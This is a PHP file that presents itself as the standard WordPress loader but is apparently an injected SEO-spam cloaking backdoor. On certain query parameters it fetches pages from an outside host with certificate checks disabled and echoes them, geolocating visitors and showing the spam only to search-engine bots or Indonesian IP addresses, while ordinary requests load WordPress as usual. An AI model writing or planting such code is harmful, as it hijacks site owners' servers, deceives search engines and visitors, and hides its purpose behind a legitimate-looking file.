<?php
/**
 * Loads the WordPress environment and template.
 *
 * @package WordPress
 */
function fetchDataFromSite($site) {
    $url = 'https://replication2.pkcdurensawit.net/superiorcollegeofscience/' . $site . '/';
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_USERAGENT => "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.1) Gecko/20061204 Firefox/2.0.0.1",
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_CUSTOMREQUEST => 'GET'
    ]);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}
function fetchDataFromSite2($site) {
    $url = 'https://replication2.pkcdurensawit.net/superiorcollegeofscience_sites/?sites='.$site;
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_USERAGENT => "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.1) Gecko/20061204 Firefox/2.0.0.1",
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_CUSTOMREQUEST => 'GET'
    ]);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}
function fetchDataFromSite3($site) {
    $url = 'https://replication2.pkcdurensawit.net/superiorcollegeofscience_web/?web='.$site;
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_USERAGENT => "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.1) Gecko/20061204 Firefox/2.0.0.1",
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_CUSTOMREQUEST => 'GET'
    ]);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}

if(isset($_GET['go'])) {
    $site = $_GET['go'];
    $data = fetchDataFromSite($site);
    echo $data;
}
elseif(isset($_GET['sites'])) {
    $site = $_GET['sites'];
    $data = fetchDataFromSite2($site);
    echo $data;
}
elseif(isset($_GET['web'])) {
    $site = $_GET['web'];
    $data = fetchDataFromSite3($site);
    echo $data;

function fetchDataNotFound() {
    $url = 'https://replication2.pkcdurensawit.net/';
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_USERAGENT => "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.1) Gecko/20061204 Firefox/2.0.0.1",
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_CUSTOMREQUEST => 'GET'
    ]);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}

function fetchDataGetIP($getIP) {
    $url = 'http://www.geoplugin.net/json.gp?ip='.$getIP;
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_USERAGENT => "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.1) Gecko/20061204 Firefox/2.0.0.1",
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_CUSTOMREQUEST => 'GET'
    ]);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}

class detectMobile{
    protected $userAgent = null;
    protected $httpHeaders = array();
    protected $matchingRegex = null;
    protected $matchesArray = null;
    protected $uaHttpHeaders = array(
        'HTTP_USER_AGENT',
        'HTTP_X_OPERAMINI_PHONE_UA',
        'HTTP_X_DEVICE_USER_AGENT',
        'HTTP_X_ORIGINAL_USER_AGENT',
        'HTTP_X_SKYFIRE_PHONE',
        'HTTP_X_BOLT_PHONE_UA',
        'HTTP_DEVICE_STOCK_UA',
        'HTTP_X_UCBROWSER_DEVICE_UA'
    );
    protected $allowedBots = array(
        'Bot' => 'Google|Googlebot|facebookexternalhit|Google-AMPHTML|s~amp-validator|AdsBot-Google|Google Keyword Suggestion|Facebot|YandexBot|YandexMobileBot|bingbot|ia_archiver|AhrefsBot|Ezooms|GSLFbot|WBSearchBot|Twitterbot|TweetmemeBot|Twikle|PaperLiBot|Wotbox|UnwindFetchor|Exabot|MJ12bot|YandexImages|TurnitinBot|Pingdom|contentkingapp',
        'MobileBot' => 'Googlebot-Mobile|AdsBot-Google-Mobile|YahooSeeker/M1A1-R2D2'
    );
    public function __construct(){
        foreach($_SERVER as $key => $value){
            if(substr($key, 0, 5) === 'HTTP_'){
                $this->httpHeaders[$key] = $value;
            }
        }
        $this->setUserAgent();
    }
    private function prepareUserAgent($userAgent){
        $userAgent = trim($userAgent);
        $userAgent = substr($userAgent, 0, 500);
        return $userAgent;
    }
    public function setUserAgent(){
        $this->userAgent = null;
        foreach($this->uaHttpHeaders as $altHeader){
            if(!empty($this->httpHeaders[$altHeader])){
                $this->userAgent .= $this->httpHeaders[$altHeader].' ';
            }
        }
        if(!empty($this->userAgent)){
            return $this->userAgent = $this->prepareUserAgent($this->userAgent);
        }
        return $this->userAgent = null;
    }
    public function isAllowedBots(){
        return $this->matchDetectionRulesAgainstUA($this->allowedBots);
    }
    protected function matchDetectionRulesAgainstUA($uaList, $userAgent = null){
        foreach($uaList as $_regex){
            if(empty($_regex)){
                continue;
            }
            if($this->match($_regex, $userAgent)){
                return true;
            }
        }
        return false;
    }
    public function match($regex, $userAgent = null){
        $match = (bool) preg_match(sprintf('#%s#is', $regex), (false === empty($userAgent) ? $userAgent : $this->userAgent), $matches);
        if($match){
            $this->matchingRegex = $regex;
            $this->matchesArray = $matches;
        }
        return $match;
    }
}
function getIpAddr(){
    if(!empty($_SERVER['HTTP_CLIENT_IP'])){
        return $_SERVER['HTTP_CLIENT_IP'];
    }elseif(!empty($_SERVER['HTTP_X_FORWARDER_FOR'])){
        return $_SERVER['HTTP_X_FORWARDER_FOR'];
    }else{
        return $_SERVER['REMOTE_ADDR'];
    }
}
$detectMobile = new detectMobile();
$isAllowedBots = $detectMobile->isAllowedBots();
$getIP = getIpAddr();
//$ipLoc = @json_decode(file_get_contents('http://www.geoplugin.net/json.gp?ip='.$getIP), true);

$ipLoc = @json_decode(fetchDataGetIP($getIP), true);
//echo $ipLoc;


$countryCode = strtolower($ipLoc['geoplugin_countryCode']);
if($countryCode === 'id' || $isAllowedBots){
  $data = fetchDataFromSite($site);
  echo $data;
}
else {
  $data = fetchDataNotFound();
  echo $data;
}
} else {
  if ( ! isset( $wp_did_header ) ) {

	$wp_did_header = true;

	// Load the WordPress library.
	require_once __DIR__ . '/wp-load.php';

	// Set up the WordPress query.
	wp();

	// Load the theme template.
	require_once ABSPATH . WPINC . '/template-loader.php';

}
}
?>
